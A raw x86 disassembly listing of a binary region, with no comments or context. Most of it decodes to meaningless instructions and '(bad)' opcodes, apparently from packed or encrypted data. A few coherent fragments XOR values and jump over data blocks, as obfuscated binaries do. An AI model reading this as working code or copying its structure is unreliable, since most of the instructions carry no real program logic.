  410c11:	xor    eax,0xf264183f
  410c16:	dec    edx
  410c17:	push   ebx
  410c18:	push   edx
  410c19:	mov    DWORD PTR [ebx+0x198aa7be],ebp
  410c1f:	mov    esi,0x112b903d
  410c24:	in     al,dx
  410c25:	imul   esi,ebx,0x3870601c
  410c2b:	sub    BYTE PTR [edx+0x57abcf86],ah
  410c31:	pop    ebx
  410c32:	faddp  st(2),st
  410c34:	add    eax,0x59764df8
  410c39:	mov    edx,0x37501cc1
  410c3e:	lods   eax,DWORD PTR ds:[esi]
  410c3f:	dec    ecx
  410c40:	adc    eax,0xa580d789
  410c45:	cmp    al,0x35
  410c47:	out    dx,eax
  410c48:	lea    esi,[esi]
  410c4a:	fld    st(1)
  410c4c:	dec    edx
  410c4d:	jmp    0xa98b:0xb8b8a25
  410c54:	mov    ch,0x98
  410c56:	jg     0x410c7e
  410c58:	pop    edx
  410c59:	or     esp,ebx
  410c5b:	pop    es
  410c5c:	dec    esi
  410c5d:	jl     0x410bf0
  410c5f:	xlat   BYTE PTR ds:[ebx]
  410c60:	cmc    
  410c61:	js     0x410c70
  410c63:	pop    es
  410c64:	add    cl,BYTE PTR [edi+0x6d]
  410c67:	and    DWORD PTR [esi+0xd],edi
  410c6a:	fmulp  st(5),st
  410c6c:	repnz dec ebp
  410c6e:	cmp    BYTE PTR [esi],dh
  410c70:	sahf   
  410c71:	je     0x410cd8
  410c73:	xchg   esi,ecx
  410c75:	and    DWORD PTR [edi],esi
  410c77:	push   es
  410c78:	cmp    eax,0xc1c3bf41
  410c7d:	push   ebx
  410c7e:	jo     0x410c8f
  410c80:	lea    ebx,[ecx+0x45]
  410c83:	push   ds
  410c84:	sbb    dl,al
  410c86:	mov    ?,ebp
  410c88:	mov    al,ds:0x33449d69
  410c8d:	sbb    dl,BYTE PTR [ebp-0x6954bf]
  410c93:	jb     0x410ceb
  410c95:	jnp    0x410c33
  410c97:	mov    WORD PTR [ebx-0x23],es
  410c9a:	mov    DWORD PTR [ebx-0x3bad5da8],edx
  410ca0:	hlt    
  410ca1:	inc    edi
  410ca2:	dec    esp
  410ca3:	dec    ecx
  410ca4:	sub    DWORD PTR [edx+0x6d],esp
  410ca7:	in     al,dx
  410ca8:	(bad)  
  410ca9:	mov    esi,0xc8c1e2bd
  410cae:	dec    edi
  410caf:	pop    esi
  410cb0:	mov    ah,0x4a
  410cb2:	in     al,dx
  410cb3:	nop
  410cb4:	bound  edi,QWORD PTR [edx+edi*1+0x5d5a08da]
  410cbb:	xor    eax,0x4ed9fc9d
  410cc0:	fist   WORD PTR gs:[eax-0x7c]
  410cc4:	jo     0x410c7b
  410cc6:	in     al,dx
  410cc7:	fadd   st,st(3)
  410cc9:	int3   
  410cca:	mov    esp,0xad93cf62
  410ccf:	popf   
  410cd0:	hlt    
  410cd1:	cli    
  410cd2:	inc    ebp
  410cd3:	pop    esp
  410cd4:	cmp    edi,DWORD PTR [ecx]
  410cd6:	imul   BYTE PTR [esi]
  410cd8:	aas    
  410cd9:	test   DWORD PTR [eax+0x21],0x8f51947a
  410ce0:	(bad)  
  410ce1:	jp     0x410ccd
  410ce3:	popf   
  410ce4:	fld    DWORD PTR [ecx+0xc90ee68]
  410cea:	clc    
  410ceb:	jae    0x410d2e
  410ced:	ja     0x410d15
  410cef:	nop
  410cf0:	cwde   
  410cf1:	mov    dl,0xf3
  410cf3:	push   0xa6041de3
  410cf8:	jno    0x410d31
  410cfa:	ror    DWORD PTR [ecx],cl
  410cfc:	mov    ds:0x7caf9074,eax
  410d01:	push   cs
  410d02:	sub    ch,BYTE PTR [ebx+0x57]
  410d05:	adc    al,0xb1
  410d07:	enter  0xe646,0x81
  410d0b:	adc    esp,DWORD PTR [edx+ebp*4]
  410d0e:	jnp    0x410d6d
  410d10:	lods   al,BYTE PTR ds:[esi]
  410d11:	fisttp WORD PTR [edx]
  410d13:	cmc    
  410d14:	loop   0x410ca2
  410d16:	adc    BYTE PTR [eax+0x7391568a],ch
  410d1c:	pusha  
  410d1d:	fwait
  410d1e:	dec    ebp
  410d1f:	out    0x24,eax
  410d21:	push   cs
  410d22:	jno    0x410cf6
  410d24:	idiv   BYTE PTR [ebx+eax*1]
  410d27:	stc    
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	ja     0x410d84
  410d62:	lods   eax,DWORD PTR ds:[esi]
  410d63:	inc    esi
  410d64:	clc    
  410d65:	push   esp
  410d66:	js     0x410de0
  410d68:	in     eax,0x7e
  410d6a:	js     0x410de4
  410d6c:	fs inc ebx
  410d6e:	into   
  410d6f:	ret    0x5f0c
  410d72:	call   0x6b28:0x1928b26f
  410d79:	out    dx,al
  410d7a:	push   ebx
  410d7b:	inc    ebx
  410d7c:	das    
  410d7d:	leave  
  410d7e:	cdq    
  410d7f:	push   ebp
  410d80:	and    bh,dl
  410d82:	dec    esi
  410d83:	adc    eax,0xee0506ec
  410d88:	add    BYTE PTR [ecx+0x6298be],dl
  410d8e:	(bad)  
  410d8f:	bound  ecx,QWORD PTR [edi-0x12]
  410d92:	xchg   esp,eax
  410d93:	and    edx,DWORD PTR [ebp+0x6f9bb5ae]
  410d99:	jbe    0x410d28
  410d9b:	icebp  
  410d9c:	mov    edx,0xb5a14510
  410da1:	jae    0x410db5
  410da3:	push   eax
  410da4:	int    0x53
  410da6:	jmp    0x1deb:0x5f45e22d
  410dad:	mov    edx,0x4ce8fb21
  410db2:	adc    esi,ebp
  410db4:	mov    ah,0x29
  410db6:	dec    eax
  410db7:	dec    ebp
  410db8:	cli    
  410db9:	stos   DWORD PTR es:[edi],eax
  410dba:	and    cl,bl
  410dbc:	mov    esi,0x8623c217
  410dc1:	push   esi
  410dc2:	push   edi
  410dc3:	mov    cl,0x4e
  410dc5:	pushf  
  410dc6:	popf   
  410dc7:	push   ds
  410dc8:	cs push eax
  410dca:	push   esp
  410dcb:	repnz sub edi,ebp
  410dce:	outs   dx,DWORD PTR ds:[esi]
  410dcf:	jp     0x410d66
  410dd1:	ins    BYTE PTR es:[edi],dx
  410dd2:	std    
  410dd3:	xchg   esp,eax
  410dd4:	sub    eax,0x58517705
  410dd9:	clc    
  410dda:	cmp    BYTE PTR [edx+0x506d05ca],cl
  410de0:	inc    ebp
  410de1:	(bad)  
  410de2:	push   ds
  410de3:	sub    BYTE PTR [eax],0xbc
  410de6:	jb     0x410d7d
  410de8:	rcl    BYTE PTR [edi+0xe],0x82
  410dec:	jl     0x410e10
  410dee:	arpl   WORD PTR [ebx+eiz*1],sp
  410df1:	inc    edi
  410df2:	cs push es
  410df4:	pop    esi
  410df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df7:	jnp    0x410e11
  410df9:	in     al,dx
  410dfa:	cli    
  410dfb:	jmp    0x410dc0
  410dfd:	rcl    DWORD PTR [ebx-0x48],0x72
  410e01:	mov    WORD PTR [eax+0x16b8973c],?
  410e07:	xor    DWORD PTR [eax+0x17],ebp
  410e0a:	loop   0x410d9f
  410e0c:	shr    BYTE PTR [ebx-0x2a],1
  410e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e10:	xor    al,0xdc
  410e12:	jnp    0x410e3b
  410e14:	push   0x4
  410e16:	outs   dx,BYTE PTR ds:[esi]
  410e17:	adc    al,0x79
  410e19:	jnp    0x410e8f
  410e1b:	ds loopne 0x410e28
  410e1e:	sbb    cl,BYTE PTR [esi+0x8]
  410e21:	hlt    
  410e22:	sbb    edi,DWORD PTR [edx-0x4]
  410e25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e26:	leave  
  410e27:	cld    
  410e28:	test   BYTE PTR [edx+0x722cac4e],bl
  410e2e:	and    al,0xc1
  410e30:	sbb    bl,ah
  410e32:	jno    0x410e42
  410e34:	clc    
  410e35:	pop    esi
  410e36:	out    dx,al
  410e37:	test   eax,0x4f97fe4e
  410e3c:	int    0xbf
  410e3e:	outs   dx,DWORD PTR ds:[esi]
  410e3f:	xchg   esi,eax
  410e40:	dec    edx
  410e41:	shl    DWORD PTR [edi+0x35],0x8c
  410e45:	mov    ch,0x74
  410e47:	call   0xe734:0x1ce4b547
  410e4e:	sub    esp,DWORD PTR [ebx-0x2]
  410e51:	push   edi
  410e52:	sub    BYTE PTR ds:0x47aa38c5,al
  410e58:	and    eax,0x1bb43d00
  410e5d:	mov    DWORD PTR [eax+0x55399be4],ecx
  410e63:	mov    BYTE PTR [esi+ecx*4],ah
  410e66:	out    0xcf,eax
  410e68:	leave  
  410e69:	inc    eax
  410e6a:	push   ecx
  410e6b:	cmp    DWORD PTR [edi+0x7e],esp
  410e6e:	cmc    
  410e6f:	fsubr  QWORD PTR [edi+0x459e0086]
  410e75:	ja     0x410e6c
  410e77:	xor    al,0x7d
  410e79:	jl     0x410e3c
  410e7b:	adc    ebp,DWORD PTR ss:[ebx+eiz*8]
  410e7f:	adc    BYTE PTR [esi+eax*4+0x63],ch
  410e83:	adc    eax,0x6d3dc042
  410e88:	sti    
  410e89:	fsubr  DWORD PTR [edi-0x1b7dd859]
  410e8f:	pushf  
  410e90:	xchg   ebp,eax
  410e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e92:	mov    bh,0x42
  410e94:	and    dh,BYTE PTR [eiz*2+0x1fd1a0c]
  410e9b:	out    0xbc,eax
  410e9d:	pop    ebp
  410e9e:	imul   ebx,DWORD PTR [eax+0x12a69c48],0xd40dec48
  410ea8:	mov    BYTE PTR [edx],cl
  410eaa:	imul   edx,eax,0x41
  410ead:	xlat   BYTE PTR ds:[ebx]
  410eae:	xor    eax,DWORD PTR [ecx]
  410eb0:	ret    0x5a16
  410eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eb4:	mov    edi,0x808f89f0
  410eb9:	gs and al,0xb
  410ebc:	xor    dh,BYTE PTR [ecx-0x34]
  410ebf:	icebp  
  410ec0:	fcomip st,st(6)
  410ec2:	stos   BYTE PTR es:[edi],al
  410ec3:	mov    ebp,0x692101a9
  410ec8:	retf   
  410ec9:	mov    bh,0x17
  410ecb:	dec    ebp
  410ecc:	pop    esp
  410ecd:	mov    eax,ds:0x48466bf1
  410ed2:	dec    edi
  410ed3:	(bad)  
  410ed4:	mov    ebx,0xbab8a20
  410ed9:	imul   esi,DWORD PTR [ecx-0x349a27a8],0x3
  410ee0:	loop   0x410ef3
  410ee2:	sub    al,0x27
  410ee4:	lods   eax,DWORD PTR ds:[esi]
  410ee5:	ror    DWORD PTR [ebp+0x58],1
  410ee8:	push   ebp
  410ee9:	lahf   
  410eea:	es add ch,dh
  410eed:	cmp    al,0x1f
  410eef:	iret   
  410ef0:	int    0x60
  410ef2:	pop    ebx
  410ef3:	rol    al,0xb9
  410ef6:	imul   eax,eax,0xc0b0d018
  410efc:	shr    BYTE PTR [ecx+esi*4+0x1e],cl
  410f00:	out    0xf2,eax
  410f02:	mov    al,0x77
  410f04:	(bad)  
  410f05:	in     eax,0xe
  410f07:	gs xchg ebx,eax
  410f09:	sbb    al,0x30
  410f0b:	pop    ds
  410f0c:	pop    ebx
  410f0d:	push   0xc7a0fd41
  410f12:	push   edx
  410f13:	cld    
  410f14:	cmp    dh,ch
  410f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f17:	pushf  
  410f18:	mov    bl,0xb4
  410f1a:	sub    esp,DWORD PTR [edi+edi*1]
  410f1d:	mov    edi,0x5667a81e
  410f22:	(bad)  
  410f23:	repnz dec eax
  410f25:	addr16 rcr ebp,1
  410f28:	jg     0x410f98
  410f2a:	lahf   
  410f2b:	in     eax,dx
  410f2c:	jbe    0x410f51
  410f2e:	cs xor bh,al
  410f31:	aam    0x63
  410f33:	int3   
  410f34:	out    0x64,al
  410f36:	sub    al,0xad
  410f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f39:	popa   
  410f3a:	mov    ch,0x1a
  410f3c:	shr    DWORD PTR cs:[esi-0x3343e73],1
  410f43:	jns    0x410f26
  410f45:	xchg   BYTE PTR [ebx-0x2676227d],ch
  410f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4c:	in     eax,dx
  410f4d:	push   edi
  410f4e:	mov    ah,0x4d
  410f50:	int3   
  410f51:	test   eax,0xccea199b
  410f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f57:	pop    ds
  410f58:	xor    eax,0xe0fcdb57
  410f5d:	jg     0x410f0d
  410f5f:	sbb    BYTE PTR [eax+0x1c4c1d89],bh
  410f65:	neg    DWORD PTR [ebx-0x24]
  410f68:	ins    BYTE PTR es:[edi],dx
  410f69:	aas    
  410f6a:	jmp    FWORD PTR [eax+0x5d]
  410f6d:	imul   DWORD PTR [ecx+0x25f49118]
  410f73:	inc    DWORD PTR [ebp-0x58]
  410f76:	mov    bh,0xb8
  410f78:	popa   
  410f79:	int3   
  410f7a:	clc    
  410f7b:	push   esp
  410f7c:	lock xchg BYTE PTR [edi-0x4b28f446],ah
  410f83:	call   0x34ac7849
  410f88:	or     eax,0x84641daa
  410f8d:	jl     0x410fe8
  410f8f:	neg    BYTE PTR [ebx]
  410f91:	inc    ecx
  410f92:	mov    dh,0x7
  410f94:	and    bl,al
  410f96:	es out 0x4,al
  410f99:	mov    bl,0xf8
  410f9b:	inc    eax
  410f9c:	in     al,dx
  410f9d:	pusha  
  410f9e:	adc    eax,0x1394b346
  410fa3:	and    edi,esp
  410fa5:	adc    BYTE PTR [ebx+0x4caffdd0],dl
  410fab:	or     ch,BYTE PTR [ebx+edi*1]
  410fae:	inc    edx
  410faf:	ret    0x21d8
  410fb2:	push   0x455e7f0
  410fb7:	fwait
  410fb8:	add    ebx,edi
  410fba:	std    
  410fbb:	push   0x9
  410fbd:	or     esp,DWORD PTR [edi+0x12]
  410fc0:	clc    
  410fc1:	cmp    WORD PTR [esi+0x522152fd],bp
  410fc8:	mov    eax,0x38dd8667
  410fcd:	retf   
  410fce:	or     dh,cl
  410fd0:	pop    ebx
  410fd1:	leave  
  410fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd3:	xor    dh,al
  410fd5:	add    bl,0x3
  410fd8:	stc    
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 loope 0x410fcd
  410fec:	call   0xe578:0x785a6550
  410ff3:	jle    0x41106d
  410ff5:	js     0x410f99
  410ff7:	add    DWORD PTR [ebx+0xa],ebx
  410ffa:	pop    edi
  410ffb:	inc    edi
  410ffc:	stc    
  410ffd:	pop    edi
  410ffe:	jl     0x410ff0
  411000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411001:	jle    0x411045
  411003:	(bad)  
  411004:	and    ch,dh
  411006:	or     dh,BYTE PTR [ecx-0x2808c93d]
  41100c:	add    eax,0x46c01501
  411011:	fcomp  QWORD PTR [eax]
  411013:	stos   DWORD PTR es:[edi],eax
  411014:	dec    ecx
  411015:	push   0xffffffa0
  411017:	or     al,0xf2
  411019:	xor    eax,0xf582bd64
  41101e:	sbb    eax,DWORD PTR [ebx+ebx*8]
  411021:	(bad)  
  411022:	jp     0x41106f
  411024:	adc    DWORD PTR [ebp+edx*8-0x4f2ab6ca],ebp
  41102b:	aaa    
  41102c:	into   
  41102d:	imul   eax,esp,0xfffffff4
  411030:	adc    BYTE PTR [edi+0x4b],bh
  411033:	(bad)  
  411034:	js     0x41102a
  411036:	dec    ebp
  411037:	cmc    
  411038:	xchg   edi,eax
  411039:	popf   
  41103a:	push   ds
  41103b:	xchg   edi,eax
  41103c:	pop    eax
  41103d:	xchg   ecx,eax
  41103e:	(bad)  
  41103f:	pop    ebp
  411040:	inc    ebx
  411041:	outs   dx,BYTE PTR ds:[esi]
  411042:	lods   al,BYTE PTR ds:[esi]
  411043:	mov    ah,0x7a
  411045:	inc    ebp
  411046:	sub    eax,0xd12f3818
  41104b:	jge    0x41103b
  41104d:	aad    0x59
  41104f:	lock lahf 
  411051:	enter  0x2b52,0x4e
  411055:	inc    eax
  411056:	mov    cl,0x60
  411058:	pushf  
  411059:	or     DWORD PTR [edi],esp
  41105b:	pop    es
  41105c:	sbb    ah,bh
  41105e:	jg     0x41100c
  411060:	in     eax,0xa5
  411062:	outs   dx,DWORD PTR ds:[esi]
  411063:	xor    BYTE PTR [ebp-0x1997e282],dh
  411069:	data16 mov ds:0xb1f41ac5,al
  41106f:	ds test al,bl
  411072:	cs jb  0x4110e5
  411075:	add    BYTE PTR [edi-0x77],ah
  411078:	pushf  
  411079:	push   ss
  41107a:	mov    ds:0x49468515,al
  41107f:	push   esi
  411080:	mov    bh,0x47
  411082:	jns    0x411070
  411084:	adc    edi,DWORD PTR [ecx+0x35]
  411087:	add    al,cl
  411089:	aam    0x7d
  41108b:	outs   dx,DWORD PTR ds:[esi]
  41108c:	(bad)  
  41108e:	nop
  41108f:	inc    ebx
  411090:	in     al,dx
  411091:	jg     0x411026
  411093:	xor    BYTE PTR [esi+0x15],cl
  411096:	int    0xc2
  411098:	popf   
  411099:	jns    0x411024
  41109b:	dec    esi
  41109c:	lock push eax
  41109e:	push   ss
  41109f:	lea    esp,[eax+0x6bdce330]
  4110a5:	push   ds
  4110a6:	mov    al,ds:0xdcb26fdf
  4110ab:	rcr    DWORD PTR [edx+0x15],cl
  4110ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110af:	mov    ebp,0xd1b58c1d
  4110b4:	mov    al,0xa9
  4110b6:	sbb    ebx,0xec7aaa1e
  4110bc:	dec    ebp
  4110bd:	push   cs
  4110be:	mov    edi,0xb4e99dbf
  4110c3:	stc    
  4110c4:	jg     0x4110fc
  4110c6:	iret   
  4110c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c8:	pop    esp
  4110c9:	out    dx,eax
  4110ca:	push   esi
  4110cb:	dec    eax
  4110cc:	lock dec eax
  4110ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110cf:	pop    ds
  4110d0:	push   edi
  4110d1:	pop    es
  4110d2:	stos   BYTE PTR es:[di],al
  4110d4:	int3   
  4110d5:	out    0x57,al
  4110d7:	sbb    edx,DWORD PTR [esi-0x51]
  4110da:	and    edx,edx
  4110dc:	mov    ebx,0x24fad766
  4110e1:	shl    BYTE PTR [ebp+esi*4+0x2717f5a6],1
  4110e8:	cli    
  4110e9:	ds push ds
  4110eb:	popf   
  4110ec:	lds    eax,FWORD PTR [ebp-0x62]
  4110ef:	js     0x41114c
  4110f1:	dec    ebp
  4110f2:	jno    0x411136
  4110f4:	test   DWORD PTR [ecx+0x3156b245],0x292b35ef
  4110fe:	nop
  4110ff:	sti    
  411100:	dec    ecx
  411101:	push   cs
  411102:	jnp    0x411168
  411104:	pop    edi
  411105:	pushf  
  411106:	and    DWORD PTR [eax],eax
  411108:	sbb    DWORD PTR [ecx+0x37],edx
  41110b:	ror    DWORD PTR [bp-0x344d],0xe9
  411111:	xchg   BYTE PTR [esi-0x13f50701],cl
  411117:	or     BYTE PTR [ebp+0x46ce0501],ch
  41111d:	stos   BYTE PTR es:[edi],al
  41111e:	xchg   ecx,eax
  41111f:	addr16 das 
  411121:	test   ecx,0x8fc8ff55
  411127:	test   al,0x6e
  411129:	retf   0x6b26
  41112c:	call   0xb9a0a355
  411131:	cld    
  411132:	xor    BYTE PTR [esi],ch
  411134:	(bad)  
  411135:	int    0xdd
  411137:	cwde   
  411138:	mov    al,ds:0x2ba7cdf8
  41113d:	out    dx,al
  41113e:	pop    ecx
  41113f:	cmp    ebp,edx
  411141:	les    esi,FWORD PTR [ebx+0x3255b0ad]
  411147:	mov    ebx,0x39bbf963
  41114c:	stos   DWORD PTR es:[edi],eax
  41114d:	out    0xd5,al
  41114f:	jg     0x411170
  411151:	push   ebp
  411152:	aas    
  411153:	or     al,0x65
  411155:	shr    BYTE PTR ds:0x208733c,0x6c
  41115c:	pop    edi
  41115d:	mov    eax,ds:0xd731bd33
  411162:	shl    BYTE PTR [esi+0x58893657],0xd
  411169:	mov    ebp,0xd5eb9e86
  41116e:	mov    esi,0x2a719b07
  411173:	call   0x6575:0xdc484ecc
  41117a:	push   esi
  41117b:	cmp    eax,0x9627f218
  411180:	xchg   DWORD PTR [edx+ebx*8-0x3],ecx
  411184:	jmp    0xc40270d6
  411189:	mov    bh,0x24
  41118b:	repz fld QWORD PTR [esi+0x66021081]
  411192:	les    esi,FWORD PTR [edi]
  411194:	out    dx,eax
  411195:	mov    edx,0xb4e213bf
  41119a:	out    dx,al
  41119b:	pop    esi
  41119c:	aam    0x24
  41119e:	shl    DWORD PTR [ebx+esi*2],0x68
  4111a2:	mov    WORD PTR [ebp+0x707be02c],fs
  4111a8:	test   al,0x4d
  4111aa:	cmp    BYTE PTR [eax-0x59b18616],ch
  4111b0:	xor    ebx,DWORD PTR [esi-0x51df0e22]
  4111b6:	sbb    DWORD PTR [esi-0x1e],0xb4cda667
  4111bd:	sahf   
  4111be:	push   es
  4111bf:	or     eax,0x9f82ab76
  4111c4:	push   0x1e
  4111c6:	jae    0x4111ba
  4111c8:	xchg   esi,eax
  4111c9:	jno    0x411206
  4111cb:	mov    al,0x1c
  4111cd:	and    al,0x82
  4111cf:	xor    DWORD PTR [ebx],esi
  4111d1:	or     al,al
  4111d3:	out    0x70,eax
  4111d5:	cmp    ecx,ecx
  4111d7:	cmovp  eax,ebp
  4111da:	mov    ss,ebx
  4111dc:	imul   edx,DWORD PTR [ecx],0xffffff9d
  4111df:	adc    BYTE PTR [eax-0x5f],ch
  4111e2:	daa    
  4111e3:	and    BYTE PTR [edi+eiz*2+0x64],dh
  4111e7:	adc    BYTE PTR [eax-0x4c],al
  4111ea:	popa   
  4111eb:	imul   ebx,DWORD PTR [edx],0x627a5c80
  4111f1:	rcr    dl,cl
  4111f3:	sub    BYTE PTR [ecx],ch
  4111f5:	mov    cl,0x12
  4111f7:	xor    eax,0xdd9d76d0
  4111fc:	push   ebx
  4111fd:	pop    ss
  4111fe:	fsub   QWORD PTR [edi]
  411200:	pop    esp
  411201:	cmp    ebp,DWORD PTR [esp+edx*4]
  411204:	imul   ebx,edx,0x1100c843
  41120a:	push   ds
  41120b:	mov    esi,DWORD PTR [edi]
  41120d:	sub    edx,eax
  41120f:	popf   
  411210:	pop    ebx
  411211:	or     esp,esp
  411213:	jl     0x41122e
  411215:	cdq    
  411216:	inc    eax
  411217:	dec    esi
  411218:	out    0xe6,al
  41121a:	jae    0x411288
  41121c:	(bad)  
  41121d:	cmp    eax,0xf71b70e6
  411222:	jae    0x4111a6
  411224:	mov    edx,0x687cebec
  411229:	xchg   edx,eax
  41122a:	cmp    DWORD PTR [ebx],ebp
  41122c:	adc    eax,0xf2bc8821
  411231:	(bad)  
  411232:	xchg   edi,eax
  411233:	das    
  411234:	aam    0x6a
  411236:	test   al,0x1c
  411238:	xchg   ebp,eax
  411239:	int    0x65
  41123b:	mov    ds:0xec7c0c68,al
  411240:	xchg   ah,dh
  411242:	adc    eax,0xcae10554
  411247:	retf   
  411248:	jg     0x411200
  41124a:	jo     0x4111e8
  41124c:	(bad)  
  41124d:	into   
  41124e:	and    dh,ch
  411250:	out    dx,al
  411251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411252:	cmp    BYTE PTR [ebp-0x2b],0x4a
  411256:	xor    BYTE PTR [edi+0x35b44d27],ch
  41125c:	mov    BYTE PTR [esi+0x7a],al
  41125f:	mul    edx
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x2a],al
  411278:	mov    ch,0x5f
  41127a:	jo     0x41124e
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	dec    ebx
  411284:	dec    esi
  411285:	xchg   esi,eax
  411286:	inc    ebx
  411287:	std    
  411288:	or     BYTE PTR [eax],ah
  41128a:	jmp    0x4112ee
  41128c:	mov    ds:0x58158319,al
  411291:	rol    bl,cl
  411293:	pop    ds
  411294:	mov    bl,0xf4
  411296:	sbb    eax,0xb355bea9
  41129b:	xor    eax,0x294db831
  4112a0:	retf   
  4112a1:	dec    esp
  4112a2:	loopne 0x41131d
  4112a4:	sbb    DWORD PTR [edi],0xdee0bac8
  4112aa:	scas   al,BYTE PTR es:[edi]
  4112ab:	push   esp
  4112ac:	jo     0x4112f2
  4112ae:	cdq    
  4112af:	dec    esp
  4112b0:	mov    DWORD PTR [eax+0x6a],esi
  4112b3:	leave  
  4112b4:	and    eax,ebp
  4112b6:	push   ebp
  4112b7:	jbe    0x411295
  4112b9:	xor    bh,BYTE PTR [eax]
  4112bb:	js     0x4112c2
  4112bd:	(bad)  
  4112bf:	pushf  
  4112c0:	fadd   st,st(7)
  4112c2:	pop    edi
  4112c3:	sbb    esp,DWORD PTR [ebp+0x27]
  4112c6:	or     DWORD PTR [ebp-0x113568c2],edi
  4112cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112cd:	mov    ecx,0xcba1a882
  4112d2:	cmp    al,0x81
  4112d4:	push   edi
  4112d5:	bswap  ebp
  4112d7:	mov    esi,0xe1f95da1
  4112dc:	push   ebx
  4112dd:	nop
  4112de:	nop    DWORD PTR [ebp+0x37]
  4112e2:	mov    ch,0x15
  4112e4:	push   esi
  4112e5:	mov    ah,0x16
  4112e7:	xchg   DWORD PTR [ebp-0x5ae27298],ebx
  4112ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ee:	rep stos BYTE PTR es:[edi],al
  4112f0:	dec    eax
  4112f1:	rcr    cl,0x2d
  4112f4:	daa    
  4112f5:	mov    ebp,0x3626cbb5
  4112fa:	mov    edi,0x41396a35
  4112ff:	mov    ch,0x4
  411301:	and    al,0x0
  411303:	fmulp  st(4),st
  411305:	adc    DWORD PTR [edx-0x4b1cc171],edx
  41130b:	pop    esi
  41130c:	push   edi
  41130d:	mov    cl,0xda
  41130f:	(bad)  
  411310:	xchg   ecx,eax
  411311:	jnp    0x411311
  411313:	jno    0x411327
  411315:	pop    ds
  411316:	dec    ebp
  411317:	adc    DWORD PTR [ebp+0x321e4bc2],edx
  41131d:	scas   eax,DWORD PTR es:[edi]
  41131e:	outs   dx,DWORD PTR ds:[esi]
  41131f:	outs   dx,DWORD PTR ds:[esi]
  411320:	hlt    
  411321:	fs (bad) 
  411324:	out    dx,eax
  411325:	outs   dx,BYTE PTR ds:[esi]
  411326:	push   ds
  411327:	adc    al,0x42
  411329:	ja     0x4113a0
  41132b:	mov    dl,0xe0
  41132d:	dec    ecx
  41132e:	mov    esi,0x363075eb
  411333:	fld    QWORD PTR [edi+edi*8+0x1fe0c10e]
  41133a:	retf   
  41133b:	fbstp  TBYTE PTR [esi+0x29142571]
  411341:	(bad)  
  411342:	mov    dh,0x7f
  411344:	aas    
  411345:	pop    ecx
  411346:	shl    DWORD PTR [ebp+0x0],0x44
  41134a:	jo     0x411375
  41134c:	clc    
  41134d:	sbb    cl,BYTE PTR [esi-0x12035663]
  411353:	repnz dec esp
  411355:	call   0x843a:0x994e2042
  41135c:	cmp    al,0x1e
  41135e:	repz adc al,BYTE PTR [edi+esi*4+0x53]
  411363:	test   al,0xb2
  411365:	pop    edi
  411366:	shl    DWORD PTR [esi-0x35],cl
  411369:	ja     0x4112fc
  41136b:	stos   DWORD PTR es:[edi],eax
  41136c:	push   cs
  41136d:	jge    0x41131a
  41136f:	xor    DWORD PTR [edi+0x5daf0567],edi
  411375:	cdq    
  411376:	fsub   QWORD PTR [ebx]
  411378:	pop    ebx
  411379:	ins    BYTE PTR es:[edi],dx
  41137a:	sub    edx,ebp
  41137c:	dec    edi
  41137d:	stos   BYTE PTR es:[edi],al
  41137e:	popf   
  41137f:	int    0x97
  411381:	push   cs
  411382:	out    0x7c,al
  411384:	fstp   QWORD PTR [edx]
  411386:	repz dec eax
  411388:	push   eax
  411389:	pop    eax
  41138a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138b:	sahf   
  41138c:	fnsave [ecx+0x429c31c3]
  411392:	cld    
  411393:	jl     0x4113b9
  411395:	fidiv  DWORD PTR [ebx+0x347cbe86]
  41139b:	aam    0x71
  41139d:	mov    dh,0x56
  41139f:	push   ds
  4113a0:	mov    esp,0xcdcb8bf7
  4113a5:	(bad)  [eax+0x31]
  4113a8:	retf   
  4113a9:	jl     0x4113a0
  4113ab:	outs   dx,BYTE PTR ds:[esi]
  4113ac:	retf   0xb6c3
  4113af:	sti    
  4113b0:	and    DWORD PTR [edx+0x2e],esi
